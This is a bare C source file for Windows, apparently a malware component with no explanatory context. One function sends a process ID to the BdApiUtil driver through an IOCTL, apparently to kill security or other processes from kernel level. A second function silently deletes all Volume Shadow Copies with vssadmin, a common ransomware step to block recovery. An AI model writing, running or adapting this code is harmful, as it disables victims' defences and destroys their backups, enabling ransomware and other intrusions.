#include <windows.h>
#include <stdlib.h>
BOOL terminate_pid(DWORD pid) {
    HANDLE device = CreateFileW(L"\\\\.\\BdApiUtil", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    DWORD returned = 0;
    BOOL result = DeviceIoControl(device, 0x800024b4, &pid, 4, NULL, 0, &returned, NULL);
    CloseHandle(device);
    return result;
}
void remove_recovery(void) {
    system("vssadmin.exe delete shadows /all /quiet");
}
